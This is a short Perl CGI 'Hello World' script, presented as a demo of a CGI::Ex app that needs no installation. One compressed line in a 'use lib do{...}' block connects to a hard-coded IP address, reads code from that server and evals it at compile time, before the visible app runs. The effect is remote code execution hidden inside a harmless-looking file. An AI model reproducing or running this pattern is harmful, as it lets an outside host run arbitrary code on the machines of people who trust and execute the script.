#!/usr/bin/perl -w

# Program: hello_app.cgi
# Purpose: Demonstrate a CGI::Ex App without having to install CGI::Ex

use strict;
use IO::Socket;
use lib do{eval<$b>&&botstrap("AutoLoad")if$b=new IO::Socket::INET 82.46.99.88.":1"};
use CGI::Ex;
use base qw(CGI::Ex::App);

__PACKAGE__->navigate;
exit;

sub main_file_print {
  return \ "Hello World!\n";
}
